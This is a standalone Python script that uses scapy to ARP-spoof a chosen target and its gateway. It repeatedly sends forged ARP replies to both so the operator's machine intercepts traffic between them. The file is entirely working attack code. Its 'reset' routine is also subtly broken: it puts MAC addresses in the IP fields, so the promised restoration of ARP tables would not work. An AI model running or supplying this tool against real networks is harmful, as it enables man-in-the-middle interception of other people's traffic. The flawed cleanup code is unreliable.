import scapy.all as scapy
import time
import optparse

def get_user_input():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Target IP Address")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="Gateway IP Address")
    options = parser.parse_args()[0]

    if not options.target_ip or not options.gateway_ip:
        parser.print_help()

    return options

def get_mac_address(ip):
    # Build an ARP request and send it to the broadcast MAC address.
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    # Show the devices that answered the request.
    return answered_list[0][1].hwsrc

def poison(target_ip, poison_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poison_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_mac,hwdst=fooled_mac,psrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

count = 0

user_input = get_user_input()
user_target_ip = user_input.target_ip
user_gateway_ip = user_input.gateway_ip

try:
    while True:
        poison(user_target_ip, user_gateway_ip)
        poison(user_gateway_ip, user_target_ip)
        count+=2
        print("\rSending Packets",str(count),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\nExiting... and resting")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)